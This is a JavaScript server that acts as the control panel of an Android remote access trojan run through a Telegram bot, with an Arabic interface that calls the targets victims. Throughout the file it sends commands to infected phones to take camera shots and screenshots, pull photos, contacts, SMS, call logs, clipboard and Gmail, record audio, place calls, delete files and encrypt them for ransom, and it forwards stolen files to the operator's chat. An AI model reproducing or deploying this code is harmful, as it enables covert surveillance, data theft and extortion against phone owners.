import express from 'express';
import http from 'http';
import { Server } from 'socket.io';
import TelegramBot from 'node-telegram-bot-api';
import https from 'https';
import multer from 'multer';
import fs from 'fs';

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

const config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new TelegramBot(config.token, { polling: true });
const appData = new Map();

const actions = [
  '📸 كيمرا خلفية 📸',
  '📸 كيمرا أمامية 📸',
  '📺 لقطة شاشة 📺',
  '🎬 سحب جميع الصور 🎬',
  '📒 سحب جهات الاتصال 📒',
  '📋 سجل الحافظة 📋',
  '💬 سحب الرسائل 💬',
  '📞 سجل المكالمات 📞',
  '🎙 تسجيل صوت 🎙',
  '📳 اهتزاز 📳',
  '▶ تشغيل الصوت ▶',
  '🛑 ايقاف الصوت 🛑',
  '📂 عرض جميع الملفات 📂',
  '✯ حذف الملفات ✯',
  '✯ تحميل ملف من الجهاز ✯',
  '✯ سحب جميع الارقام ✯',
  '📧 سحب رسائل الجيميل 📧',
  '☎️ اتصال من هاتف الضحية ☎️',
  '✯ قائمة التحكم ✯',
  '⚠️ تشفير الملفات ⚠️',
  '🦝 اظهار اشعارات الضحية 🦝',
  '‼ اظهار رسالة منبثقة ‼',
  '😎 اظهار رسالة على الشاشة 😎',
  '✯ العودة إلى القائمة الرئيسية ✯'
];

app.get('/', (req, res) => {
  res.send('<b>✯ بوت رات قوي بوت تحكم بالاجهزه ✯</b>');
});

app.post('/upload', uploader.single('file'), (req, res) => {
  const fileName = req.file.originalname;
  const fileBuffer = req.file.buffer;
  bot.sendDocument(config.id, req.file.buffer, {
    caption: '✯ تم رفع الخ...\n' + fileName + '\n',
    parse_mode: 'HTML'
  }, {
    filename: fileName,
    contentType: '*/*'
  });
  res.send('Done');
});

io.on('connection', (socket) => {
  const deviceName = socket.handshake.query.name || 'Unknown';
  const deviceModel = socket.handshake.query.model || 'Unknown';
  const deviceIP = socket.handshake.query.ip || 'Unknown';
  socket.name = deviceName;
  socket.model = deviceModel;

  let connectMsg = '✯ جهاز جديد متصل ✯\n' +
    'اسم الجهاز: ' + deviceName + '\n' +
    'الموديل: ' + deviceModel + '\n' +
    'الآيبي: ' + deviceIP + '\n' +
    '✯ عدد الاجهزة المتصلة: ' + io.sockets.sockets.size + '\n\n';
  bot.sendMessage(config.id, connectMsg, { parse_mode: 'HTML' });

  socket.on('disconnect', () => {
    let disconnectMsg = '✯ جهاز غير متصل ✯\n' +
      'اسم الجهاز: ' + deviceName + '\n' +
      'الموديل: ' + deviceModel + '\n' +
      'الآيبي: ' + deviceIP + '\n' +
      '✯ عدد الاجهزة المتصلة: ' + io.sockets.sockets.size + '\n\n';
    bot.sendMessage(config.id, disconnectMsg, { parse_mode: 'HTML' });
  });

  socket.on('getFiles', (files) => {
    let fileList = [];
    let tempRow = [];
    files.forEach((file, index) => {
      let callbackData;
      if (file.isFolder) {
        callbackData = socket.name + '|cd-' + file.name;
      } else {
        callbackData = socket.name + '|request-' + file.name;
      }
      if (tempRow.length === 2 || index === files.length - 1) {
        tempRow.push({ text: file.name, callback_data: callbackData });
        fileList.push(tempRow);
        tempRow = [];
      } else {
        tempRow.push({ text: file.name, callback_data: callbackData });
      }
    });
    fileList.push([{ text: '✯ العودة ✯', callback_data: socket.name + '|back-0' }]);
    bot.sendMessage(config.id, '✯ قائمة الملفات في الجهاز: ' + socket.name, {
      reply_markup: { inline_keyboard: fileList },
      parse_mode: 'HTML'
    });
  });

  socket.on('fileRequest', (fileData) => {
    bot.sendMessage(config.id, '✯ تم تحميل الملف من الجهاز: ' + socket.name + '\n' + fileData, {
      parse_mode: 'HTML'
    });
  });
});

bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (text === '/start') {
    bot.sendMessage(config.id, '✯ اهلا وسهلا في بوت رات قوي بوت تحكم بالاجهزه ✯\n' +
      '✯ تم تطوير البوت من قبل المطور @S7_MX3 ✯\n' +
      '✯ هذا البوت يخترق الاجهزة بواسطة رابط خبيث ✯\n' +
      '✯ صنع برمجيا للتسليه ولا يتحمل المسؤولية ✯\n' +
      '✯ تم تطويره لاختراق الاجهزة والراقابه ✯\n' +
      '✯ للتواصل بل المطور @S7_MX3 ✯', {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [
          ['📱 عرض الاجهزة المتصلة', '📱 ارسال امر لجهاز معين'],
          ['📱 القائمة الرئيسية']
        ],
        resize_keyboard: true
      }
    });
  }

  if (appData.get('currentAct') === 'selectTarget') {
    let targetName = msg.text;
    let socketId = appData.get('currentSocket');
    io.to(socketId).emit('action', {
      request: 'selectTarget',
      extras: [{ key: 'targetName', value: targetName }]
    });
    appData.delete('currentSocket');
    appData.delete('currentAct');
    bot.sendMessage(config.id, '✯ تم تنفيذ الطلب بنجاح', {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [
          ['📱 عرض الاجهزة المتصلة', '📱 ارسال امر لجهاز معين'],
          ['📱 القائمة الرئيسية']
        ],
        resize_keyboard: true
      }
    });
  }

  if (appData.get('currentAct') === 'selectDevice') {
    let targetName = msg.text;
    appData.set('commandTarget', targetName);
    appData.set('currentAct', 'waitingCommand');
    bot.sendMessage(config.id, '✯ ارسل الامر الذي تريد تنفيذه على الجهاز: ' + targetName, {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [['✯ العودة ✯']],
        resize_keyboard: true,
        one_time_keyboard: true
      }
    });
  }

  if (appData.get('currentAct') === 'waitingCommand') {
    let command = msg.text;
    let targetName = appData.get('commandTarget');
    let socketId = appData.get('currentSocket');
    io.to(socketId).emit('action', {
      request: 'sendCommand',
      extras: [
        { key: 'targetName', value: targetName },
        { key: 'command', value: command }
      ]
    });
    appData.delete('currentSocket');
    appData.delete('currentAct');
    appData.delete('commandTarget');
    bot.sendMessage(config.id, '✯ تم تنفيذ الطلب بنجاح', {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [
          ['📱 عرض الاجهزة المتصلة', '📱 ارسال امر لجهاز معين'],
          ['📱 القائمة الرئيسية']
        ],
        resize_keyboard: true
      }
    });
  }

  if (text === '📱 عرض الاجهزة المتصلة') {
    if (io.sockets.sockets.size === 0) {
      bot.sendMessage(config.id, '✯ لايوجد اجهزة متصلة حالياً ✯', { parse_mode: 'HTML' });
    } else {
      let devicesList = '✯ الاجهزة المتصلة ✯\n';
      let counter = 1;
      io.sockets.sockets.forEach((socket, id) => {
        devicesList += counter + '- اسم الجهاز: ' + socket.name + '\n' +
          'الموديل: ' + socket.model + '\n' +
          'الآيبي: ' + socket.ip + '\n' +
          '✯ رقم الجلسة: ' + socket.id + '\n\n';
        counter++;
      });
      bot.sendMessage(config.id, devicesList, { parse_mode: 'HTML' });
    }
  }

  if (text === '📱 ارسال امر لجهاز معين') {
    if (io.sockets.sockets.size === 0) {
      bot.sendMessage(config.id, '✯ لايوجد اجهزة متصلة حالياً ✯', { parse_mode: 'HTML' });
    } else {
      let deviceButtons = [];
      io.sockets.sockets.forEach((socket) => {
        deviceButtons.push([socket.name]);
      });
      deviceButtons.push(['✯ العودة ✯']);
      bot.sendMessage(config.id, '✯ اختر الجهاز الذي تريد ارسال الامر له:', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: deviceButtons,
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }
  }

  if (text === '📱 القائمة الرئيسية') {
    bot.sendMessage(config.id, '✯ القائمة الرئيسية ✯', { parse_mode: 'HTML' });
  }

  if (text === '✯ العودة ✯') {
    bot.sendMessage(config.id, '✯ تم العودة للقائمة الرئيسية ✯', {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [
          ['📱 عرض الاجهزة المتصلة', '📱 ارسال امر لجهاز معين'],
          ['📱 القائمة الرئيسية']
        ],
        resize_keyboard: true
      }
    });
  }

  if (text !== undefined && io.sockets.sockets.some(s => s.name === text)) {
    let selectedSocket = null;
    let selectedId = null;
    io.sockets.sockets.forEach((socket, id) => {
      if (socket.name === text) {
        selectedSocket = socket;
        selectedId = id;
      }
    });
    if (selectedSocket) {
      appData.set('currentSocket', selectedId);
      appData.set('currentAct', 'waitingCommand');
      bot.sendMessage(config.id, '✯ تم اختيار الجهاز: ' + text + '\n✯ ارسل الامر الذي تريد تنفيذه:', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [
            ['📸 كيمرا خلفية 📸', '📸 كيمرا أمامية 📸'],
            ['📺 لقطة شاشة 📺', '🎬 سحب جميع الصور 🎬'],
            ['📒 سحب جهات الاتصال 📒', '📋 سجل الحافظة 📋'],
            ['💬 سحب الرسائل 💬', '📞 سجل المكالمات 📞'],
            ['🎙 تسجيل صوت 🎙', '📳 اهتزاز 📳'],
            ['▶ تشغيل الصوت ▶', '🛑 ايقاف الصوت 🛑'],
            ['📂 عرض جميع الملفات 📂', '✯ حذف الملفات ✯'],
            ['✯ تحميل ملف من الجهاز ✯', '📧 سحب رسائل الجيميل 📧'],
            ['☎️ اتصال من هاتف الضحية ☎️', '✯ قائمة التحكم ✯'],
            ['⚠️ تشفير الملفات ⚠️'],
            ['🦝 اظهار اشعارات الضحية 🦝', '‼ اظهار رسالة منبثقة ‼'],
            ['😎 اظهار رسالة على الشاشة 😎', '✯ العودة ✯']
          ],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }
  }

  if (actions.includes(text)) {
    let socketId = appData.get('currentSocket');
    if (text === '📸 كيمرا خلفية 📸') {
      io.to(socketId).emit('action', { request: 'main-camera', extras: [] });
      appData.delete('currentSocket');
      bot.sendMessage(config.id, '✯ تم تنفيذ الطلب بنجاح', { parse_mode: 'HTML' });
    } else if (text === '📸 كيمرا أمامية 📸') {
      io.to(socketId).emit('action', { request: 'selfie-cam', extras: [] });
      appData.delete('currentSocket');
      bot.sendMessage(config.id, '✯ تم تنفيذ الطلب بنجاح', { parse_mode: 'HTML' });
    } else if (text === '📺 لقطة شاشة 📺') {
      io.to(socketId).emit('action', { request: 'screenshot', extras: [] });
      appData.delete('currentSocket');
      bot.sendMessage(config.id, '✯ تم تنفيذ الطلب بنجاح', { parse_mode: 'HTML' });
    } else if (text === '🎬 سحب جميع الصور 🎬') {
      io.to(socketId).emit('action', { request: 'gallery', extras: [] });
      appData.delete('currentSocket');
      bot.sendMessage(config.id, '✯ تم تنفيذ الطلب بنجاح', { parse_mode: 'HTML' });
    } else if (text === '📒 سحب جهات الاتصال 📒') {
      io.to(socketId).emit('action', { request: 'contacts', extras: [] });
      appData.delete('currentSocket');
      bot.sendMessage(config.id, '✯ تم تنفيذ الطلب بنجاح', { parse_mode: 'HTML' });
    } else if (text === '📋 سجل الحافظة 📋') {
      io.to(socketId).emit('action', { request: 'clipboard', extras: [] });
      appData.delete('currentSocket');
      bot.sendMessage(config.id, '✯ تم تنفيذ الطلب بنجاح', { parse_mode: 'HTML' });
    } else if (text === '💬 سحب الرسائل 💬') {
      io.to(socketId).emit('action', { request: 'all-sms', extras: [] });
      appData.delete('currentSocket');
      bot.sendMessage(config.id, '✯ تم تنفيذ الطلب بنجاح', { parse_mode: 'HTML' });
    } else if (text === '📞 سجل المكالمات 📞') {
      io.to(socketId).emit('action', { request: 'calls', extras: [] });
      appData.delete('currentSocket');
      bot.sendMessage(config.id, '✯ تم تنفيذ الطلب بنجاح', { parse_mode: 'HTML' });
    } else if (text === '🎙 تسجيل صوت 🎙') {
      io.to(socketId).emit('action', { request: 'recordVoice', extras: [] });
      appData.delete('currentSocket');
      bot.sendMessage(config.id, '✯ تم تنفيذ الطلب بنجاح', { parse_mode: 'HTML' });
    } else if (text === '📳 اهتزاز 📳') {
      appData.set('currentAct', 'vibrateDuration');
      appData.set('currentSocket', socketId);
      bot.sendMessage(config.id, '✯ ارسل مدة الاهتزاز بالمللي ثانية (مثال: 5000)', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ العودة ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else if (text === '▶ تشغيل الصوت ▶') {
      io.to(socketId).emit('action', { request: 'playAudio', extras: [] });
      appData.delete('currentSocket');
      bot.sendMessage(config.id, '✯ تم تنفيذ الطلب بنجاح', { parse_mode: 'HTML' });
    } else if (text === '🛑 ايقاف الصوت 🛑') {
      io.to(socketId).emit('action', { request: 'stopAudio', extras: [] });
      appData.delete('currentSocket');
      bot.sendMessage(config.id, '✯ تم تنفيذ الطلب بنجاح', { parse_mode: 'HTML' });
    } else if (text === '📂 عرض جميع الملفات 📂') {
      io.to(socketId).emit('action', { request: 'file-explorer', extras: [] });
      appData.delete('currentSocket');
      bot.sendMessage(config.id, '✯ تم تنفيذ الطلب بنجاح', { parse_mode: 'HTML' });
    } else if (text === '✯ حذف الملفات ✯') {
      appData.set('currentAct', 'deleteFiles');
      appData.set('currentSocket', socketId);
      bot.sendMessage(config.id, '✯ ارسل اسم الملف الذي تريد حذفه:', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ العودة ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else if (text === '✯ تحميل ملف من الجهاز ✯') {
      appData.set('currentAct', 'uploadFile');
      appData.set('currentSocket', socketId);
      bot.sendMessage(config.id, '✯ ارسل اسم الملف الذي تريد تحميله:', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ العودة ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else if (text === '📧 سحب رسائل الجيميل 📧') {
      io.to(socketId).emit('action', { request: 'all-email', extras: [] });
      appData.delete('currentSocket');
      bot.sendMessage(config.id, '✯ تم تنفيذ الطلب بنجاح', { parse_mode: 'HTML' });
    } else if (text === '☎️ اتصال من هاتف الضحية ☎️') {
      appData.set('currentAct', 'makeCall');
      appData.set('currentSocket', socketId);
      bot.sendMessage(config.id, '✯ ارسل رقم الهاتف الذي تريد الاتصال به:', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ العودة ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else if (text === '✯ قائمة التحكم ✯') {
      bot.sendMessage(config.id, '✯ قائمة التحكم ✯', { parse_mode: 'HTML' });
    } else if (text === '⚠️ تشفير الملفات ⚠️') {
      appData.set('currentAct', 'encryptFiles');
      appData.set('currentSocket', socketId);
      bot.sendMessage(config.id, '✯ ارسل كود فك التشفير:', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ العودة ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else if (text === '🦝 اظهار اشعارات الضحية 🦝') {
      io.to(socketId).emit('action', { request: 'notifications', extras: [] });
      appData.delete('currentSocket');
      bot.sendMessage(config.id, '✯ تم تنفيذ الطلب بنجاح', { parse_mode: 'HTML' });
    } else if (text === '‼ اظهار رسالة منبثقة ‼') {
      appData.set('currentAct', 'showPopup');
      appData.set('currentSocket', socketId);
      bot.sendMessage(config.id, '✯ ارسل النص الذي تريد اظهاره:', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ العودة ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else if (text === '😎 اظهار رسالة على الشاشة 😎') {
      appData.set('currentAct', 'showToast');
      appData.set('currentSocket', socketId);
      bot.sendMessage(config.id, '✯ ارسل النص الذي تريد اظهاره:', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [['✯ العودة ✯']],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    } else if (text === '✯ العودة ✯') {
      appData.delete('currentSocket');
      appData.delete('currentAct');
      appData.delete('commandTarget');
      bot.sendMessage(config.id, '✯ تم العودة للقائمة الرئيسية ✯', {
        parse_mode: 'HTML',
        reply_markup: {
          keyboard: [
            ['📱 عرض الاجهزة المتصلة', '📱 ارسال امر لجهاز معين'],
            ['📱 القائمة الرئيسية']
          ],
          resize_keyboard: true
        }
      });
    }
  }

  if (msg.callback_query) {
    const callbackData = msg.callback_query.data;
    const parts = callbackData.split('|');
    const deviceName = parts[0];
    const command = parts[1];
    const extra = parts[2] || '';

    if (command === 'request') {
      io.sockets.sockets.forEach((socket, id) => {
        if (socket.name === deviceName) {
          io.to(id).emit('action', {
            request: 'request',
            extras: [{ key: 'fileName', value: extra }]
          });
        }
      });
    } else if (command === 'cd') {
      io.sockets.sockets.forEach((socket, id) => {
        if (socket.name === deviceName) {
          io.to(id).emit('action', {
            request: 'cd',
            extras: [{ key: 'dir', value: extra }]
          });
        }
      });
    } else if (command === 'delete') {
      io.sockets.sockets.forEach((socket, id) => {
        if (socket.name === deviceName) {
          io.to(id).emit('action', {
            request: 'delete',
            extras: [{ key: 'dir', value: extra }]
          });
        }
      });
    } else if (command === 'upload') {
      bot.editMessageText('✯ تم تحميل الملف: ' + extra, {
        chat_id: config.id,
        message_id: msg.callback_query.message.message_id,
        reply_markup: {
          inline_keyboard: [[
            { text: '✅ تأكيد', callback_data: deviceName + '|confirm-' + extra },
            { text: '❌ الغاء', callback_data: deviceName + '|cancel-' + extra }
          ]]
        },
        parse_mode: 'HTML'
      });
    }
  }
});

setInterval(() => {
  io.sockets.sockets.forEach((socket, id) => {
    io.to(id).emit('ping', {});
  });
}, 5000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log('Server listening on port ' + PORT);
});
